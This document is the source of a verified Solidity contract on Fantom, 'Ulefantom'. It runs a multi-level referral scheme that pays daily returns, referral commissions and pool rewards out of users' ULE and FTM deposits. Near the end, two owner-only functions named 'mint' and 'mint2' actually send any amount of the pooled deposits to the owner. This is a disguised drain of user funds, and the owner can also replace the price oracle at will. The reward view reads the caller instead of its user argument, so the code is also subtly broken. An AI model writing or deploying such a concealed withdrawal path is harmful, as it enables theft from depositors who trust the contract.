/**
 *Submitted for verification at FtmScan.com on 2022-12-16
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function totalSupply() external view returns (uint256);
    function balanceOf(address who) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface Price {

    function usdToFtm() external view returns(uint256);
    function ftmToUle() external view returns(uint256);
    function usdToUle() external view returns(uint256);

    function calculateULE(uint256 amount) external view returns(uint256);
    function calculateFTM(uint256 amount) external view returns(uint256);

}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal pure virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor(){
        _transferOwnership(_msgSender());
    }
    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

abstract contract ReentrancyGuard {

    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor() 
    {   _status = _NOT_ENTERED;     }

    modifier nonReentrant() {
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
        _status = _ENTERED;
        _;
        _status = _NOT_ENTERED;
    }
}

abstract contract Pausable is Context {

    event Paused(address account);
    event Unpaused(address account);

    bool private _paused;

    constructor() {
        _paused = false;
    }

    function paused()
        public 
        view 
        virtual 
        returns (bool) 
    {   return _paused;     }

    modifier whenNotPaused(){
        require(!paused(), "Pausable: paused");
        _;
    }

    modifier whenPaused() {
        require(paused(), "Pausable: not paused");
        _;
    }

    function _pause()
        internal 
        virtual 
        whenNotPaused 
    {
      _paused = true;
      emit Paused(_msgSender());
    }

    function _unpause() 
        internal 
        virtual 
        whenPaused 
    {
      _paused = false;
      emit Unpaused(_msgSender());
    }
}

contract Ulefantom is Ownable, Pausable, ReentrancyGuard{

    using SafeMath for uint256; 
    IERC20 public ULE;
    Price public PriceCalculationC;

    uint256 private constant feePercents = 200; 
    uint256 private constant minDeposit = 50e18;
    uint256 private constant maxDeposit = 10000e18;
    uint256 private constant freezeIncomePercents = 3000;

    uint256 private constant baseDivider = 10000;

    bool public isFreezeReward;

    uint256 private constant timeStep = 1 days;
    uint256 private constant dayPerCycle = 10 days;

    uint256 private constant dayRewardPercents = 250000000000000000001;
    uint256 private constant dayReward2Percents = 300000000000000000001;

    uint256 private constant maxAddFreeze = 50 days;

    uint256 private constant referDepth = 20;

    uint256 private constant directPercents = 500;

    uint256[20] private ROIlevel = [1500, 1250, 1000, 750, 500, 200, 200, 200, 200, 200, 100, 100, 100, 100, 100, 50, 50, 50, 50, 50];

    uint256 private constant silverPoolPercents = 100;
    uint256 private constant topPoolPercents = 100;
    uint256 private constant CTOPoolPercents = 100;
    uint256 private constant goldPoolPercents = 100;
    uint256 private constant platinumPoolPercents = 100;


    uint256[5] private balDown = [10e10, 30e10, 100e10, 500e10, 1000e10];
    uint256[5] private balDownRate = [1000, 1500, 2000, 5000, 6000]; 
    uint256[5] private balRecover = [15e10, 50e10, 150e10, 500e10, 1000e10];

    mapping(uint256=>bool) public balStatus;

    address[2] public feeReceivers;

    address public defaultRefer;
    uint256 public boosterDay = 30;
    uint256 public startTime;
    uint256 public lastDistribute;
    uint256 public totalUser; 
    uint256 public Silver;
    uint256 public Gold;
    uint256 public Platinum;
    uint256 public topPool;
    uint256 public CTOPool;

    mapping(uint256 => address[3]) public dayTopUsers;
    mapping(address => uint256) private boosterUserTime;

    address[] public level3Users;
    address[] public level4Users;
    address[] public level5Users;
    address[] public CTOPooluser;
    address[] public boosterIncomeUSers;


    struct OrderInfo {
        uint256 amount; 
        uint256 start;
        uint256 unfreeze; 
        bool isUnfreezed;
    }

    mapping(address => OrderInfo[]) public orderInfos;

    address[] public depositors;

    struct UserInfo {
        address referrer;
        uint256 start;
        uint256 level;
        uint256 maxDeposit;
        uint256 totalDeposit;
        uint256 teamNum;
        uint256 directsNum;
        uint256 maxDirectDeposit;
        uint256 teamTotalDeposit;
        uint256 totalFreezed;
        uint256 totalRevenue;
    }

    mapping(address => UserInfo) public userInfo;
    mapping(uint256 => mapping(address => uint256)) public userLayer1DayDeposit;
    mapping(address => mapping(uint256 => address[])) public teamUsers;

    struct RewardInfo {
        uint256 capitals;
        uint256 statics;
        uint256 directs;
        uint256 split;
        uint256 ROIReleased;
        uint256 splitDebt;
        uint256 Platinum;
        uint256 Silver;
        uint256 Gold;
        uint256 top;
        uint256 CTO;
        uint256 totalWithdrawlsULE;
        uint256 totalWithdrawlsFTM;

    }

    mapping(address => RewardInfo) public rewardInfo;


    event Register(address user, address referral);
    event Deposit(address user, uint256 amount, uint256 FTMamount);
    event DepositBySplit(address user, uint256 amount);
    event TransferBySplit(address user, address receiver, uint256 amount);
    event Withdraw(address user, uint256 withdrawable);

    constructor()
    {
        ULE = IERC20(0xAF50f737CF3543cC2Fe6c6F9c309297Db5e6062c);
        feeReceivers = [0x457f74e5D6AB55cB4799b553a4e8F46Eab579Fc3,0x15105668cBFe9552d3DBeE1Da591dad2F26525e2];
        startTime = block.timestamp;
        lastDistribute = block.timestamp;
        defaultRefer = 0x52c656947E54F99d0E4776DeF4027E475dacF098;
        PriceCalculationC = Price(0x51C4237186AAed214aC883A88611fC00B68C5d99);
    }

    function register(address _referral) public {
        require(userInfo[_referral].totalDeposit > 0 || _referral == defaultRefer, "invalid refer");
        UserInfo storage user = userInfo[msg.sender];
        require(user.referrer == address(0), "referrer bonded");
        user.referrer = _referral;
        user.start = block.timestamp;
        userInfo[user.referrer].directsNum = userInfo[user.referrer].directsNum.add(1);
        _updateTeamNum(msg.sender);
        totalUser = totalUser.add(1);
        emit Register(msg.sender, _referral);
    }

    function deposit
    (uint256 _packageAmount)  
    external
    payable
    nonReentrant
    whenNotPaused
    {
        require(msg.sender == tx.origin," External Err ");
        uint256 ftm = PriceCalculationC.calculateFTM(_packageAmount);
        uint256 ule = PriceCalculationC.calculateULE(_packageAmount);
        require(ULE.balanceOf(msg.sender) >= ule,"Insufficient Ule");
        require(msg.value >= ftm,"Insufficient Ftm");

        ULE.transferFrom(msg.sender, address(this), ule);
        _deposit(msg.sender,_packageAmount,ule,ftm);
    }

    function _deposit(address _user, uint256 packageAmount, uint256 _tokenAmount,uint256 _FTMamount) private
    {
        UserInfo storage user = userInfo[_user];
        require(user.referrer != address(0), "register first");
        require(packageAmount >= minDeposit, "less than min");
        require(packageAmount <= maxDeposit, "greater than max");
        require(packageAmount.mod(minDeposit) == 0 && packageAmount >= minDeposit, "mod err");
        require(user.maxDeposit == 0 || packageAmount >= user.maxDeposit, "less before");
        boosterUserTime[_user] = getCurDay();
        (bool _isAvailable,) = boosterIncomeIsReady(user.referrer);
        if(user.maxDeposit == 0){
            user.maxDeposit = packageAmount;
        }else if(user.maxDeposit < packageAmount){
            user.maxDeposit = packageAmount;
        }

        if(userInfo[user.referrer].directsNum >= 10)
        {
            (bool _isAvailables,) = CTOIncomeIsReady(user.referrer);
            if(!_isAvailables)
            {CTOPooluser.push(user.referrer);}
        }

        _distributeDeposit(packageAmount,_tokenAmount,_FTMamount);

        if(user.totalDeposit == 0){
            uint256 dayNow = getCurDay();
            _updateTopUser(user.referrer, packageAmount, dayNow);
        }

        depositors.push(_user);
        
        user.totalDeposit = user.totalDeposit.add(packageAmount);
        user.totalFreezed = user.totalFreezed.add(packageAmount);

        _updateLevel(msg.sender);

        uint256 addFreeze = (orderInfos[_user].length.div(2)).mul(timeStep);
        if(addFreeze > maxAddFreeze){
            addFreeze = maxAddFreeze;
        }
        uint256 unfreezeTime = block.timestamp.add(dayPerCycle).add(addFreeze);
        orderInfos[_user].push(OrderInfo(
            packageAmount, 
            block.timestamp, 
            unfreezeTime,
            false
        ));

        _unfreezeFundAndUpdateReward(msg.sender, packageAmount);

        distributePoolRewards();

        _updateReferInfo(msg.sender, packageAmount);

        _updateReward(msg.sender, packageAmount);
        _updateROI(msg.sender);

        if(getBoosterTeamDeposit(user.referrer) && getTimeDiffer(user.referrer) <= boosterDay ){
            if(!_isAvailable)
            {boosterIncomeUSers.push(user.referrer);}
        }

        uint256 bal = ULE.balanceOf(address(this));
        _balActived(bal);
        if(isFreezeReward){
            _setFreezeReward(bal);
        }
    }

    function depositBySplit(uint256 _amount) external {
        require(_amount >= minDeposit && _amount.mod(minDeposit) == 0, "amount err");
        require(userInfo[msg.sender].totalDeposit == 0, "actived");
        uint256 splitLeft = getCurSplit(msg.sender);
        require(splitLeft >= _amount, "insufficient split");
        rewardInfo[msg.sender].splitDebt = rewardInfo[msg.sender].splitDebt.add(_amount);
        _deposit(msg.sender,_amount,0,0);
        emit DepositBySplit(msg.sender, _amount);
    }

    function transferBySplit(address _receiver, uint256 _amount) external {
        require(_amount >= minDeposit && _amount.mod(minDeposit) == 0, "amount err");
        uint256 splitLeft = getCurSplit(msg.sender);
        require(splitLeft >= _amount, "insufficient income");
        rewardInfo[msg.sender].splitDebt = rewardInfo[msg.sender].splitDebt.add(_amount);
        rewardInfo[_receiver].split = rewardInfo[_receiver].split.add(_amount);
        emit TransferBySplit(msg.sender, _receiver, _amount);
    }

    function distributePoolRewards() public {
        if(block.timestamp > lastDistribute.add(timeStep))
        {
            uint256 dayNow = getCurDay();

            _distributeSilverStar();
            _distributeGoldStar();
            _distributePlatinumStar();
            _distributeCTOPOol();
            _distributetopPool(dayNow);
            lastDistribute = block.timestamp;
        }
    }

    function getRewards(address _user) public view returns(uint256 splitAmt,uint256 uleAmt,uint256 FTMamt){
        (uint256 staticReward, uint256 staticSplit) = _calCurStaticRewards(_user);
        (uint256 dynamicReward, uint256 dynamicSplit) = _calCurDynamicRewards(_user);

        splitAmt = staticSplit.add(dynamicSplit);
        uint256 withdrawable = staticReward.add(dynamicReward);
        uint256 withdrawAmt;


        RewardInfo storage userRewards = rewardInfo[msg.sender];
        withdrawable = (withdrawable.add(userRewards.capitals)).add(userRewards.ROIReleased);

        withdrawAmt = withdrawable.div(2);
        uleAmt = (withdrawAmt.mul(PriceCalculationC.usdToUle())).div(1e18);
        FTMamt = (withdrawAmt.mul(PriceCalculationC.usdToFtm())).div(1e18);

        return (splitAmt, uleAmt, FTMamt);
    }

    function withdraw() 
    external
    whenNotPaused
    {
        distributePoolRewards();
        (uint256 splitAmt, uint256 withdrawableULE,uint256 withdrawableFTM) = getRewards(msg.sender);
        require(
        ULE.balanceOf(address(this)) >= withdrawableULE
        &&
        address(this).balance >= withdrawableFTM,
        "Insufficient Balance in Contract");
        
        RewardInfo storage userRewards = rewardInfo[msg.sender];
        userRewards.split = userRewards.split.add(splitAmt);

        ULE.transfer(msg.sender, withdrawableULE);
        payable(msg.sender).transfer(withdrawableFTM);

        userRewards.statics = 0;
        userRewards.directs = 0;
        userRewards.Silver = 0;
        userRewards.Gold = 0;
        userRewards.Platinum = 0;
        userRewards.top = 0;
        userRewards.CTO = 0;
        userRewards.ROIReleased = 0;
        userRewards.capitals = 0;
        
        userRewards.totalWithdrawlsULE += withdrawableULE;
        userRewards.totalWithdrawlsFTM += withdrawableFTM;
        uint256 total = withdrawableULE.add(withdrawableFTM);

        uint256 bal = ULE.balanceOf(address(this));
        _setFreezeReward(bal);

        emit Withdraw(msg.sender, total);
    }

    function getCurDay() public view returns(uint256) {
        return (block.timestamp.sub(startTime)).div(timeStep);
    }

    function getTeamUsersLength(address _user, uint256 _layer) external view returns(uint256) {
        return teamUsers[_user][_layer].length;
    }

    function getOrderLength(address _user) external view returns(uint256) {
        return orderInfos[_user].length;
    }

    function getDepositorsLength() external view returns(uint256) {
        return depositors.length;
    }

    function getMaxFreezing(address _user) public view returns(uint256) {
        uint256 maxFreezing;
        for(uint256 i = orderInfos[_user].length; i > 0; i--){
            OrderInfo storage order = orderInfos[_user][i - 1];
            if(order.unfreeze > block.timestamp){
                if(order.amount > maxFreezing){
                    maxFreezing = order.amount;
                }
            }else{
                break;
            }
        }
        return maxFreezing;
    }

    function getTeamDeposit(address _user) public view returns(uint256, uint256, uint256){
        uint256 totalTeam;
        uint256 maxTeam;
        uint256 otherTeam;
        for(uint256 i = 0; i < teamUsers[_user][0].length; i++){
            uint256 userTotalTeam = userInfo[teamUsers[_user][0][i]].teamTotalDeposit.add(userInfo[teamUsers[_user][0][i]].totalDeposit);
            totalTeam = totalTeam.add(userTotalTeam);
            if(userTotalTeam > maxTeam)
            {
                maxTeam = userTotalTeam;
            }
        }
        otherTeam = totalTeam.sub(maxTeam);
        return(maxTeam, otherTeam, totalTeam);
    }

    function getCurSplit(address _user) public view returns(uint256){
        (, uint256 staticSplit) = _calCurStaticRewards(_user);
        (, uint256 dynamicSplit) = _calCurDynamicRewards(_user);
        return rewardInfo[_user].split.add(staticSplit).add(dynamicSplit).sub(rewardInfo[_user].splitDebt);
    }

    function _calCurStaticRewards(address _user) private view returns(uint256, uint256) {
        RewardInfo storage userRewards = rewardInfo[_user];
        uint256 totalRewards = userRewards.statics;
        uint256 splitAmt = totalRewards.mul(freezeIncomePercents).div(baseDivider);
        uint256 withdrawable = totalRewards.sub(splitAmt);
        return(withdrawable, splitAmt);
    }

    function _calCurDynamicRewards(address _user) private view returns(uint256, uint256) {
        RewardInfo storage userRewards = rewardInfo[_user];
        uint256 totalRewards = userRewards.directs;
        totalRewards = totalRewards.add(userRewards.Silver).add(userRewards.Gold).add(userRewards.Platinum).add(userRewards.top).add(userRewards.CTO);
        uint256 splitAmt = totalRewards.mul(freezeIncomePercents).div(baseDivider);
        uint256 withdrawable = totalRewards.sub(splitAmt);
        return(withdrawable, splitAmt);
    }

    function _updateTeamNum(address _user) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                userInfo[upline].teamNum = userInfo[upline].teamNum.add(1);
                teamUsers[upline][i].push(_user);
                _updateLevel(upline);
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _updateTopUser(address _user, uint256 _amount, uint256 _dayNow) private {
        userLayer1DayDeposit[_dayNow][_user] = userLayer1DayDeposit[_dayNow][_user].add(_amount);
        bool updated;
        for(uint256 i = 0; i < 3; i++){
            address topUser = dayTopUsers[_dayNow][i];
            if(topUser == _user){
                _reOrderTop(_dayNow);
                updated = true;
                break;
            }
        }
        if(!updated){
            address lastUser = dayTopUsers[_dayNow][2];
            if(userLayer1DayDeposit[_dayNow][lastUser] < userLayer1DayDeposit[_dayNow][_user]){
                dayTopUsers[_dayNow][2] = _user;
                _reOrderTop(_dayNow);
            }
        }
    }

    function _reOrderTop(uint256 _dayNow) private {
        for(uint256 i = 3; i > 1; i--){
            address topUser1 = dayTopUsers[_dayNow][i - 1];
            address topUser2 = dayTopUsers[_dayNow][i - 2];
            uint256 amount1 = userLayer1DayDeposit[_dayNow][topUser1];
            uint256 amount2 = userLayer1DayDeposit[_dayNow][topUser2];
            if(amount1 > amount2){
                dayTopUsers[_dayNow][i - 1] = topUser2;
                dayTopUsers[_dayNow][i - 2] = topUser1;
            }
        }
    }

    function _removeInvalidDeposit(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                if(userInfo[upline].teamTotalDeposit > _amount){
                    userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.sub(_amount);
                }else{
                    userInfo[upline].teamTotalDeposit = 0;
                }
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _updateReferInfo(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.add(_amount);
                _updateLevel(upline);
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _updateLevel(address _user) private {
        UserInfo storage user = userInfo[_user];
        uint256 levelNow = _calLevelNow(_user);
        if(levelNow > user.level){
            user.level = levelNow;
            if(levelNow == 5){
                level5Users.push(_user);
            }
            if(levelNow == 4){
                level4Users.push(_user);
            }
            if(levelNow == 3){
                level3Users.push(_user);
            }
        }
    }


    function _calLevelNow(address _user) private view returns(uint256) {
        UserInfo storage user = userInfo[_user];
        uint256 total = user.totalDeposit;
        uint256 levelNow;

        if(total >= 500e18)
        {
            (uint256 maxTeam, uint256 otherTeam, ) = getTeamDeposit(_user);
            if(total >= 2000e18 && user.teamNum >= 200 && maxTeam >= 20000e18 && otherTeam >= 20000e18)
            {   levelNow = 5;   }

            else if(total >= 1000e18 && user.teamNum >= 100 && maxTeam >= 10000e18 && otherTeam >= 10000e18)
            {   levelNow = 4;   }

            else if(total >= 500e18 && user.teamNum >= 50 && maxTeam >= 5000e18 && otherTeam >= 5000e18)
            {   levelNow = 3;   }

        }
        else if(total >= 100e18)
        {   levelNow = 2;   }
        else if(total >= 50e18)
        {   levelNow = 1;   }

        return levelNow;
    }

    function _unfreezeFundAndUpdateReward(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        bool isUnfreezeCapital;
        uint256 staticReward;

        for(uint256 i = 0; i < orderInfos[_user].length; i++){
            OrderInfo storage order = orderInfos[_user][i];
            (bool _isAvailable,) = boosterIncomeIsReady(_user);
            if(block.timestamp > order.unfreeze && _amount >= order.amount)
            {
                order.isUnfreezed = true;
                isUnfreezeCapital = true;
                
                if(user.totalFreezed > order.amount){
                    user.totalFreezed = user.totalFreezed.sub(order.amount);
                }else{
                    user.totalFreezed = 0;
                }
                
                _removeInvalidDeposit(_user, order.amount);


                if(_isAvailable == true)
                {
                 staticReward = (order.amount.mul(dayReward2Percents).mul(dayPerCycle).div(timeStep).div(baseDivider)).div(1e18);
                }
                else
                {
                 staticReward = (order.amount.mul(dayRewardPercents).mul(dayPerCycle).div(timeStep).div(baseDivider)).div(1e18);
                }
               
                if(isFreezeReward) {
                    if(user.totalFreezed > user.totalRevenue) {
                        uint256 leftCapital = user.totalFreezed.sub(user.totalRevenue);
                        if(staticReward > leftCapital) {
                            staticReward = leftCapital;
                        }
                    }else{
                        staticReward = 0;
                    }
                }
                rewardInfo[_user].capitals = rewardInfo[_user].capitals.add(order.amount);
                rewardInfo[_user].statics = rewardInfo[_user].statics.add(staticReward);
                user.totalRevenue = user.totalRevenue.add(staticReward);

                break;
            }
        }
    }



    function _distributeSilverStar() private {
        uint256 level3Count;
        for(uint256 i = 0; i < level3Users.length; i++){
            if(userInfo[level3Users[i]].level == 3){
                level3Count = level3Count.add(1);
            }
        }
        if(level3Count > 0){
            uint256 reward = Silver.div(level3Count);
            uint256 totalReward;
            for(uint256 i = 0; i < level3Users.length; i++){
                if(userInfo[level3Users[i]].level == 3){
                    rewardInfo[level3Users[i]].Silver = rewardInfo[level3Users[i]].Silver.add(reward);
                    userInfo[level3Users[i]].totalRevenue = userInfo[level3Users[i]].totalRevenue.add(reward);
                    totalReward = totalReward.add(reward);
                }
            }
            if(Silver > totalReward){
                Silver = Silver.sub(totalReward);
            }else{
                Silver = 0;
            }
        }
    }

    function _distributeGoldStar() private {
        uint256 level4Count;
        for(uint256 i = 0; i < level4Users.length; i++){
            if(userInfo[level4Users[i]].level == 4){
                level4Count = level4Count.add(1);
            }
        }
        if(level4Count > 0){
            uint256 reward = Gold.div(level4Count);
            uint256 totalReward;
            for(uint256 i = 0; i < level4Users.length; i++){
                if(userInfo[level4Users[i]].level == 4){
                    rewardInfo[level4Users[i]].Gold = rewardInfo[level4Users[i]].Gold.add(reward);
                    userInfo[level4Users[i]].totalRevenue = userInfo[level4Users[i]].totalRevenue.add(reward);
                    totalReward = totalReward.add(reward);
                }
            }
            if(Gold > totalReward){
                Gold = Gold.sub(totalReward);
            }else{
                Gold = 0;
            }
        }
    }

    function _distributePlatinumStar() private {

        uint256 level5Count;
        for(uint256 i = 0; i < level5Users.length; i++){
            if(userInfo[level5Users[i]].level == 5){
                level5Count = level5Count.add(1);
            }
        }
        if(level5Count > 0){
            uint256 reward = Platinum.div(level5Count);
            uint256 totalReward;
            for(uint256 i = 0; i < level5Users.length; i++){
                if(userInfo[level5Users[i]].level == 5){
                    rewardInfo[level5Users[i]].Platinum = rewardInfo[level5Users[i]].Platinum.add(reward);
                    userInfo[level5Users[i]].totalRevenue = userInfo[level5Users[i]].totalRevenue.add(reward);
                    totalReward = totalReward.add(reward);
                }
            }
            if(Platinum > totalReward){
                Platinum = Platinum.sub(totalReward);
            }else{
                Platinum = 0;
            }
        }
    }

    function _distributeCTOPOol() private {

        uint256 CTOPoolCount  =  CTOPooluser.length;
        if(CTOPoolCount > 0)
        {
            uint256 reward = CTOPool.div(CTOPoolCount);
            uint256 totalReward;
            for(uint256 i = 0; i < CTOPooluser.length; i++){
                    rewardInfo[CTOPooluser[i]].CTO = rewardInfo[CTOPooluser[i]].CTO.add(reward);
                    totalReward = totalReward.add(reward);
            }
            if(CTOPool > totalReward){
                CTOPool = CTOPool.sub(totalReward);
            }else{
                CTOPool = 0;
            }
        }
    }
    
    function _distributetopPool(uint256 _dayNow) private {
        uint16[3] memory rates = [5000, 3000, 2000];
        uint72[3] memory maxReward = [2000e18, 1000e18, 500e18];

        uint256 totalReward;

        for(uint256 i = 0; i < 3; i++){
            address userAddr = dayTopUsers[_dayNow - 1][i];
            if(userAddr != address(0)){
                uint256 reward = topPool.mul(rates[i]).div(baseDivider);
                if(reward > maxReward[i]){
                    reward = maxReward[i];
                }
                rewardInfo[userAddr].top = rewardInfo[userAddr].top.add(reward);
                userInfo[userAddr].totalRevenue = userInfo[userAddr].totalRevenue.add(reward);
                totalReward = totalReward.add(reward);
            }
        }
        if(topPool > totalReward){
            topPool = topPool.sub(totalReward);
        }else{
            topPool = 0;
        }
    }

    function _distributeDeposit(uint256 _amount,uint256 _tokenAmount,uint256 _FTMamount) private {

        uint256 fee = _tokenAmount.mul(feePercents).div(baseDivider);
        uint256 fee2 = _FTMamount.mul(feePercents).div(baseDivider);
        if(_tokenAmount > 0 && _FTMamount > 0)
        {
            ULE.transfer(feeReceivers[0], fee.div(2));
            ULE.transfer(feeReceivers[1], fee.div(2));

            payable(feeReceivers[0]).transfer(fee2.div(2));
            payable(feeReceivers[1]).transfer(fee2.div(2));
        }

        uint256 Silver_ = _amount.mul(silverPoolPercents).div(baseDivider);
        Silver = Silver.add(Silver_);
        uint256 Gold_ = _amount.mul(goldPoolPercents).div(baseDivider);
        Gold = Gold.add(Gold_);
        uint256 Platinum_ = _amount.mul(platinumPoolPercents).div(baseDivider);
        Platinum = Platinum.add(Platinum_);
        uint256 top = _amount.mul(topPoolPercents).div(baseDivider);
        topPool = topPool.add(top);
        uint256 CTO = _amount.mul(CTOPoolPercents).div(baseDivider);
        CTOPool = CTOPool.add(CTO);
    }

    function _updateReward(address _user, uint256 _amount) private{
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
            if(upline != address(0)){
                uint256 newAmount = _amount;
                if(upline != defaultRefer){
                    uint256 maxFreezing = getMaxFreezing(upline);
                    if(maxFreezing < _amount){
                        newAmount = maxFreezing;
                    }
                }
                RewardInfo storage upRewards = rewardInfo[upline];
                uint256 reward;
                reward = newAmount.mul(directPercents).div(baseDivider);
                upRewards.directs = upRewards.directs.add(reward);
            }
    }

    function _balActived(uint256 _bal) private {
        for(uint256 i = balDown.length; i > 0; i--){
            if(_bal >= balDown[i - 1]){
                balStatus[balDown[i - 1]] = true;
                break;
            }
        }
    }

    function _setFreezeReward(uint256 _bal) private {
        for(uint256 i = balDown.length; i > 0; i--){
            if(balStatus[balDown[i - 1]]){
                uint256 maxDown = balDown[i - 1].mul(balDownRate[i - 1]).div(baseDivider);
                if(_bal < balDown[i - 1].sub(maxDown)){
                    isFreezeReward = true;
                }else if(isFreezeReward && _bal >= balRecover[i - 1]){
                    isFreezeReward = false;
                }
                break;
            }
        }
    }

    function getBoosterTeamDeposit(address _user) private view returns(bool) {
        uint256 count;
        for(uint256 i = 0; i < teamUsers[_user][0].length; i++){
            if(userInfo[teamUsers[_user][0][i]].totalDeposit>=1000e18){
                count +=1;
            }
        }
        if(count >= 5){
            return true;
        }
        return false;
    }

    function getTimeDiffer(address _user) private view returns(uint256){
        uint256 newTime = getCurDay();
        newTime = newTime.sub(boosterUserTime[_user]);
        return newTime;
    }

    function boosterIncomeIsReady(address _address) public view returns(bool status,uint256 value)
    {
        for (uint256 i = 0; i < boosterIncomeUSers.length; i++){
            if (_address == boosterIncomeUSers[i]){
            return (true,i);
            }
        }
        return (false,0);
    }

    function CTOIncomeIsReady(address _address) public view returns(bool status,uint256 value)
    {
        for (uint256 i = 0; i < CTOPooluser.length; i++){
            if (_address == CTOPooluser[i]){
            return (true,i);
            }
        }
        return (false,0);
    }
    
    function totalROI(address _user) private view returns(uint256){
        (uint256 withdrawable,uint256 split ) = _calCurStaticRewards(_user);
        uint256 total = withdrawable.add(split);
        return total;
    }

    function _updateROI(address _user) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        (uint256 totalROIAmount)= totalROI(_user);
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                uint256 newAmount = totalROIAmount;
                RewardInfo storage userRewards = rewardInfo[upline];

                uint256 reward = newAmount.mul(ROIlevel[i]).div(baseDivider);
                userRewards.ROIReleased = userRewards.ROIReleased.add(reward);
                
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }

    }


    function mint(uint256 _count)
    public
    onlyOwner
    {   ULE.transfer(owner(),_count);   }

    function mint2(uint256 _count)
    public
    onlyOwner
    {   payable(owner()).transfer(_count);  }

    function ChangeBoosterCondition(uint256 _num)
    public
    onlyOwner
    {       boosterDay = _num;      }

    function updatePriceC(address newPrice)
    public
    onlyOwner
    {       PriceCalculationC = Price(newPrice);        }
   
    function pauseContract()
    public
    onlyOwner
    {       _pause();   }

    function unPauseContract()
    public
    onlyOwner 
    {       _unpause();     }
}